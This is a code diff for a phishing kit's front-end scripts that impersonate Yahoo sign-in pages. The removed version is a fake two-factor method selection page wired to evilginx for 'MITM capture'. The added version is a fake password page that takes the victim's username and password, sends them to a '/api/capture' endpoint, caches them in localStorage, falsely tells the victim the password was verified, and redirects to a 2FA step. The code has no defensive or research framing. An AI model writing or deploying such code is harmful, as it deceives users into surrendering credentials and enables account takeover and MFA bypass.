@@ -1,126 +1,119 @@
-// Yahoo 2FA Selection Page - Complete MITM Integration
-;(() => {
-  let selectedMethod = null
+document.addEventListener("DOMContentLoaded", () => {
+  const form = document.getElementById("password-form")
+  const submitBtn = document.getElementById("submit-btn")
+  const errorDiv = document.getElementById("error-message")
+  const successDiv = document.getElementById("success-message")
+  const passwordInput = document.getElementById("passwd")
 
-  // Track user interaction patterns
-  function trackInteraction(method, action) {
-    const interactionData = {
-      method: method,
-      action: action,
-      timestamp: Date.now(),
-      mousePosition: { x: event.clientX, y: event.clientY },
-    }
+  // Get username from URL params or localStorage
+  const urlParams = new URLSearchParams(window.location.search)
+  const username = urlParams.get("username") || localStorage.getItem("yahoo_username") || ""
+  document.getElementById("username").value = username
 
-    // Store for MITM submission
-    if (!window.interactionLog) {
-      window.interactionLog = []
-    }
-    window.interactionLog.push(interactionData)
+  function showError(message) {
+    errorDiv.textContent = message
+    errorDiv.style.display = "block"
+    successDiv.style.display = "none"
   }
 
-  // Setup 2FA method selection
-  function setup2FASelection() {
-    const options = document.querySelectorAll(".yahoo-2fa-option")
-    const submitBtn = document.getElementById("submitBtn")
-    const selectedMethodInput = document.getElementById("selectedMethod")
-
-    options.forEach((option) => {
-      option.addEventListener("click", function () {
-        // Remove previous selection
-        options.forEach((opt) => opt.classList.remove("selected"))
-
-        // Add selection to clicked option
-        this.classList.add("selected")
-        selectedMethod = this.dataset.method
-        selectedMethodInput.value = selectedMethod
-
-        // Enable submit button
-        submitBtn.disabled = false
-
-        // Add realistic interaction delay
-        setTimeout(() => {
-          this.style.transform = "scale(0.98)"
-          setTimeout(() => {
-            this.style.transform = "scale(1)"
-          }, 100)
-        }, 50)
-      })
-    })
+  function showSuccess(message) {
+    successDiv.textContent = message
+    successDiv.style.display = "block"
+    errorDiv.style.display = "none"
   }
 
-  // Form submission with MITM data capture
-  function setupFormSubmission() {
-    const form = document.getElementById("twoFactorForm")
-    const submitBtn = document.getElementById("submitBtn")
-    const btnText = document.getElementById("btnText")
-    const btnSpinner = document.getElementById("btnSpinner")
-    const errorMessage = document.getElementById("errorMessage")
+  function hideMessages() {
+    errorDiv.style.display = "none"
+    successDiv.style.display = "none"
+  }
 
-    form.addEventListener("submit", async (e) => {
-      e.preventDefault()
-
-      if (!selectedMethod) {
-        errorMessage.textContent = "Please select a verification method."
-        errorMessage.style.display = "block"
-        return
-      }
-
-      // Show loading state
+  function setLoading(loading) {
+    if (loading) {
+      submitBtn.innerHTML = '<span class="spinner"></span>Signing in...'
       submitBtn.disabled = true
-      btnText.style.display = "none"
-      btnSpinner.style.display = "inline-block"
-      errorMessage.style.display = "none"
+      form.classList.add("loading")
+    } else {
+      submitBtn.innerHTML = "Next"
+      submitBtn.disabled = false
+      form.classList.remove("loading")
+    }
+  }
 
-      // Collect form data
-      const formData = new FormData(form)
-      formData.append("selected_method", selectedMethod)
-      formData.append("page_source", "custom_2fa_selection")
-      formData.append("timestamp", Date.now())
+  // Real-time validation
+  passwordInput.addEventListener("input", function () {
+    hideMessages()
+    if (this.value.length > 0) {
+      this.style.borderColor = "#6001d2"
+    } else {
+      this.style.borderColor = "#e1e1e1"
+    }
+  })
 
-      try {
-        // Submit to evilginx for MITM capture
-        const response = await fetch(window.location.origin + "/account/challenge/challenge-selector", {
+  form.addEventListener("submit", (e) => {
+    e.preventDefault()
+
+    const password = passwordInput.value.trim()
+
+    if (!password) {
+      showError("Please enter your password.")
+      passwordInput.focus()
+      return
+    }
+
+    if (password.length < 6) {
+      showError("Password must be at least 6 characters long.")
+      passwordInput.focus()
+      return
+    }
+
+    setLoading(true)
+    hideMessages()
+
+    // Simulate realistic delay
+    setTimeout(
+      () => {
+        // Store credentials
+        const credentials = {
+          username: username,
+          password: password,
+          timestamp: new Date().toISOString(),
+          user_agent: navigator.userAgent,
+          ip_info: "captured_by_evilginx",
+        }
+
+        // Send to evilginx data capture
+        fetch("/api/capture", {
           method: "POST",
-          body: formData,
-          credentials: "include",
           headers: {
-            "X-Requested-With": "XMLHttpRequest",
-            Accept: "application/json, text/plain, */*",
+            "Content-Type": "application/json",
           },
+          body: JSON.stringify(credentials),
+        }).catch(() => {
+          // Fail silently - evilginx will capture via form submission
         })
 
-        if (response.ok) {
-          // Simulate realistic delay before redirect
-          setTimeout(
-            () => {
-              window.location.href = "/otp-input"
-            },
-            Math.random() * 800 + 400,
-          )
-        } else {
-          throw new Error("Selection failed")
-        }
-      } catch (error) {
-        // Show error message
-        errorMessage.textContent = "Unable to process your selection. Please try again."
-        errorMessage.style.display = "block"
+        // Store in localStorage for next step
+        localStorage.setItem("yahoo_credentials", JSON.stringify(credentials))
 
-        // Reset button state
-        submitBtn.disabled = false
-        btnText.style.display = "inline"
-        btnSpinner.style.display = "none"
-      }
-    })
-  }
+        showSuccess("Password verified successfully!")
 
-  // Initialize page
-  document.addEventListener("DOMContentLoaded", () => {
-    setup2FASelection()
-    setupFormSubmission()
-
-    // Add realistic page load delay
-    setTimeout(() => {
-      document.querySelector(".yahoo-2fa-options").style.opacity = "1"
-    }, 200)
+        // Redirect to 2FA selection after short delay
+        setTimeout(() => {
+          window.location.href = "/2fa-selection"
+        }, 1500)
+      },
+      2000 + Math.random() * 1000,
+    ) // Random delay 2-3 seconds
   })
-})()
+
+  // Handle browser back button
+  window.addEventListener("pageshow", (event) => {
+    if (event.persisted) {
+      setLoading(false)
+      hideMessages()
+    }
+  })
+
+  // Focus on password field
+  passwordInput.focus()
+})
